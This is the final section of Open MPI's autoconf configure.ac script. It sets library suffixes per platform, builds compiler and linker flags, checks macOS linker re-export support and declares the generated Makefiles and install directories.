# Libtool code (even though we don't support several of these
# platforms, there didn't seem to be any harm in leaving in some of
# them, alhtough I did remove some that we have never/will never
# support, like OS/2).
OPAL_DYN_LIB_PREFIX=lib
case $host_os in
cygwin*)
    OPAL_DYN_LIB_PREFIX=cyg
    OPAL_DYN_LIB_SUFFIX=dll
    ;;
mingw* | pw32* | cegcc*)
    OPAL_DYN_LIB_SUFFIX=dll
    ;;
darwin* | rhapsody*)
    OPAL_DYN_LIB_SUFFIX=dylib
    ;;
hpux9* | hpux10* | hpux11*)
    case $host_cpu in
        ia64*)
        OPAL_DYN_LIB_SUFFIX=so
        ;;
    *)
        OPAL_DYN_LIB_SUFFIX=sl
        ;;
    esac
    ;;
*)
   OPAL_DYN_LIB_SUFFIX=so
   ;;
esac
AC_SUBST(OPAL_DYN_LIB_PREFIX)
AC_SUBST(OPAL_DYN_LIB_SUFFIX)

# Need the libtool executable before the rpathify stuff
LT_OUTPUT

############################################################################
# final compiler config
############################################################################

m4_ifdef([project_ompi], [opal_show_subtitle "Compiler flags"])

#
# This is needed for VPATH builds, so that it will -I the appropriate
# include directory.  We delayed doing it until now just so that
# '-I$(top_srcdir)' doesn't show up in any of the configure output --
# purely aesthetic.
#
# Because opal_config.h and mpi.h are created by AC_CONFIG_HEADERS, we
# don't need to -I the builddir for <opal,ompi>/include. If we VPATH
# building, we do need to include the source directories, however.
#
if test "$OMPI_TOP_BUILDDIR" != "$OMPI_TOP_SRCDIR"; then
    # Note the embedded m4 directives here -- we must embed them
    # rather than have successive assignments to these shell
    # variables, lest the $(foo) names try to get evaluated here.
    # Yuck!
    cpp_includes='$(top_srcdir) $(top_builddir) $(top_srcdir)/opal/include m4_ifdef([project_ompi], [$(top_srcdir)/ompi/include]) m4_ifdef([project_oshmem], [$(top_srcdir)/oshmem/include])'
else
    cpp_includes='$(top_srcdir)'
fi

CPP_INCLUDES="$(echo $cpp_includes | $SED 's/[[^ \]]* */'"$opal_cc_iquote"'&/g')"
CXX_INCLUDES="$(echo $cpp_includes | $SED 's/[[^ \]]* */'"$opal_cxx_iquote"'&/g')"
CPPFLAGS="$CPP_INCLUDES $CPPFLAGS"
# C++ is only relevant if we're building OMPI
m4_ifdef([project_ompi],[CXXCPPFLAGS="$CXX_INCLUDES $CXXCPPFLAGS"])

# OMPI needs some additional processing of the flags (e.g., get
# versions without optimization for debugger modules).

m4_ifdef([project_ompi], [OMPI_SETUP_DEBUGGER_FLAGS])

############################################################################
# Symbol re-export detection for libmpi backward compatibility
############################################################################
# Detect platform-specific linker support for re-exporting symbols from
# libopen_mpi through libmpi to maintain v5.x binary compatibility.
#
# This is only needed on macOS, where the two-level namespace records
# which library each symbol was found in at link time: a v5.x-built
# binary looked up the predefined MPI handle symbols (e.g.,
# ompi_mpi_comm_world) in libmpi, so libmpi must re-export them now
# that they live in libopen_mpi.  On ELF platforms the global symbol
# namespace is flat: libmpi's DT_NEEDED dependency on libopen_mpi is
# sufficient for a v5.x binary's references to resolve at run time,
# so no re-export mechanism is required at all.
m4_ifdef([project_ompi], [
    AC_MSG_CHECKING([for linker symbol re-export support])
    ompi_reexport_method="none"

    OPAL_VAR_SCOPE_PUSH([LDFLAGS_save])

    # Save current LDFLAGS
    LDFLAGS_save="$LDFLAGS"

    case $host_os in
    darwin* | rhapsody*)
        # macOS: Test -reexport_library flag
        LDFLAGS="$LDFLAGS_save -Wl,-reexport_library,/usr/lib/libSystem.dylib"
        AC_LINK_IFELSE([AC_LANG_PROGRAM([], [])],
                       [ompi_reexport_method=macos],
                       [AC_MSG_WARN([macOS linker does not support -reexport flag])])
        ;;
    *)
        ;;
    esac

    # Restore LDFLAGS
    LDFLAGS="$LDFLAGS_save"
    OPAL_VAR_SCOPE_POP

    AC_MSG_RESULT([$ompi_reexport_method])

    AM_CONDITIONAL([OMPI_REEXPORT_MACOS],
                   [test "$ompi_reexport_method" = "macos"])
])

# libopen_mpi fails at link time.
# See https://github.com/open-mpi/ompi/issues/2956
# but the check does not seem to work on all architectures.
m4_ifdef([project_ompi], [OMPI_SETUP_LAYERING_CHECKS])

#
# Delayed the substitution of CFLAGS and friends until now because
# they may have been modified throughout the course of this script.
#

AC_SUBST(CFLAGS)
AC_SUBST(CPPFLAGS)
m4_ifdef([project_ompi], [AC_SUBST(FFLAGS)
                          AC_SUBST(FCFLAGS)

                          AC_SUBST(OMPI_LIBMPI_EXTRA_LIBS)
                          AC_SUBST(OMPI_LIBMPI_EXTRA_LDFLAGS)])

#
# Aggregate MCA parameters directory
#
AC_SUBST([AMCA_PARAM_SETS_DIR], ['$(opaldatadir)/amca-param-sets'])

############################################################################
# final wrapper compiler config
############################################################################

opal_show_subtitle "Wrapper compiler final setup"
# The OMPI wrapper scripts (i.e., not the C-compiled
# executables) need perl.
AC_PATH_PROG(PERL, perl, perl)

OPAL_SETUP_WRAPPER_FINAL

# Recreate some defines prefixed with OMPI_ so that there are no bare
# autoconf macro defines in mpi.h.  Since AC sometimes changes whether
# things are defined as null tokens or an integer result, two projects
# with different versions of AC can cause problems.

# According to the autoconf 2.67 documentation the AC_HEADER_STDC macro,
# and therefore the ac_cv_header_stdc cache variable, is obsolescent, as
# current systems have conforming header files. Instead of removing the
# protection completely, let's just make sure it is always on.
AC_DEFINE(OPAL_STDC_HEADERS, 1,
          [Do not use outside of mpi.h.  Define to 1 if you have the ANSI C header files.])
if test $ac_cv_header_sys_time_h = yes ; then
    AC_DEFINE(OPAL_HAVE_SYS_TIME_H, 1,
              [Do not use outside of mpi.h.  Define to 1 if you have the <sys/time.h> header file.])
fi
if test $ac_cv_type_long_long = yes ; then
    AC_DEFINE(OPAL_HAVE_LONG_LONG, 1,
              [Do not use outside of mpi.h.  Define to 1 if the system has the type `long long'.]) dnl `
fi
if test $ac_cv_header_sys_synch_h = yes ; then
    AC_DEFINE(OPAL_HAVE_SYS_SYNCH_H, 1,
              [Do not use outside of mpi.h.  Define to 1 if you have the <sys/synch.h> header file.])
fi


# If there is a local hook for each project, call it.  This allows 3rd
# parties to add configuration steps to OPAL and/or OMPI simply
# by placing a file in [opal|ompi]/config/whatever.m4 that
# AC_DEFUN's the appropriate macro name -- no patching is necessary.
# If that macro is defined, we'll run it here.
#
# Unfortunately, aclocal is not smart enough to parse something like
# the following in opal_mca.m4 (when we're already m4 looping over the
# project list):
#
# m4_foreach(mca_project, [mca_project_list],
#           [m4_ifdef(mca_project[_CONFIG_LOCAL], mca_project[_CONFIG_LOCAL])])
#
# Meaning that aclocal doesn't see that, for example,
# "ompi_CONFIG_LOCAL" is actually invoked at the bottom and therefore
# go look for an .m4 file that contains it.  Instead, we have to
# manually list the macros here.  *Then* aclocal is smart enough to go
# look for an .m4 file containing each macro, and if found,
# automatically m4_include the corresponding in aclocal.m4.  Bummer.
# :-\

m4_ifdef([opal_CONFIG_LOCAL], [opal_CONFIG_LOCAL])
m4_ifdef([project_ompi],
         [m4_ifdef([ompi_CONFIG_LOCAL], [ompi_CONFIG_LOCAL])])

############################################################################
# Party on
############################################################################

# set projects good/no good AM_CONDITIONALS.  This is at the end so
# that the OSHMEM/OMPI projects can be disabled, if needed, based on
# MCA tests.  If a project is to be disabled, also remove it from
# MCA_PROJECT_SUBDIRS to actually disable building.
AM_CONDITIONAL([PROJECT_OMPI], [test "$project_ompi_amc" = "true"])
AM_CONDITIONAL([PROJECT_OSHMEM], [test "$project_oshmem_amc" = "true"])

AC_MSG_CHECKING([if libtool needs -no-undefined flag to build shared libraries])
case "`uname`" in
  CYGWIN*|MINGW*|AIX*)
    ## Add in the -no-undefined flag to LDFLAGS for libtool.
    AC_MSG_RESULT([yes])
    LDFLAGS="$LDFLAGS -no-undefined"
    ;;
  *)
    ## Don't add in anything.
    AC_MSG_RESULT([no])
    ;;
esac

# opaldatadir, opallibdir, and opalinclude are essentially the same as
# pkg*dir, but will always be */openmpi.  This is to make it a bit
# easier to deal with the problem of opal and ompi built from
# their own tarballs, with their own PACKAGE variables.
opaldatadir='${datadir}/openmpi'
opallibdir='${libdir}/openmpi'
opalincludedir='${includedir}/openmpi'
AC_SUBST(opaldatadir)
AC_SUBST(opallibdir)
AC_SUBST(opalincludedir)

OPAL_SET_MCA_PREFIX([OMPI_MCA_])
OPAL_SET_MCA_CMD_LINE_ID([mca])
m4_ifdef([project_ompi],
         [ompidatadir="$opaldatadir"
          AC_SUBST(ompidatadir)
          ompilibdir="$opallibdir"
          AC_SUBST(ompilibdir)
          ompiincludedir="$opalincludedir"
          AC_SUBST(ompiincludedir)])
m4_ifdef([project_oshmem],
         [oshmemdatadir="$opaldatadir"
          AC_SUBST(oshmemdatadir)
          oshmemlibdir="$opallibdir"
          AC_SUBST(oshmemlibdir)
          oshmemincludedir="$opalincludedir"
          AC_SUBST(oshmemincludedir)])

opal_show_subtitle "Final output"

AC_MSG_CHECKING([OMPI final CPPFLAGS])
AC_MSG_RESULT([$CPPFLAGS])
AC_MSG_CHECKING([OMPI final LDFLAGS])
AC_MSG_RESULT([$LDFLAGS])
AC_MSG_CHECKING([OMPI final LIBS])
AC_MSG_RESULT([$LIBS])

AC_CONFIG_FILES([
    Makefile

    docs/Makefile

    config/Makefile

    contrib/Makefile

    contrib/dist/mofed/debian/changelog
    contrib/dist/mofed/debian/control
    contrib/dist/mofed/debian/copyright:LICENSE

    3rd-party/Makefile

    test/Makefile
    test/event/Makefile
    test/asm/Makefile
    test/datatype/Makefile
    test/class/Makefile
    test/mpool/Makefile
    test/rcache/Makefile
    test/support/Makefile
    test/threads/Makefile
    test/util/Makefile
])

AC_CONFIG_FILES([contrib/dist/mofed/debian/rules],
                [chmod +x contrib/dist/mofed/debian/rules])
AC_CONFIG_FILES([contrib/dist/mofed/compile_debian_mlnx_example],
                [chmod +x contrib/dist/mofed/compile_debian_mlnx_example])

AS_IF([test -n "$OPAL_MAKEDIST_DISABLE"],
      [AC_MSG_WARN(["make dist" will be disabled due to: $OPAL_MAKEDIST_DISABLE])])
AC_SUBST([OPAL_MAKEDIST_DISABLE])

OPAL_CONFIG_FILES
m4_ifdef([project_ompi], [OMPI_CONFIG_FILES])
m4_ifdef([project_oshmem], [OSHMEM_CONFIG_FILES])

OPAL_CHECK_LIBNL_SUMMARY

# checkpoint results
AC_CACHE_SAVE

AC_OUTPUT

OPAL_SUMMARY_PRINT
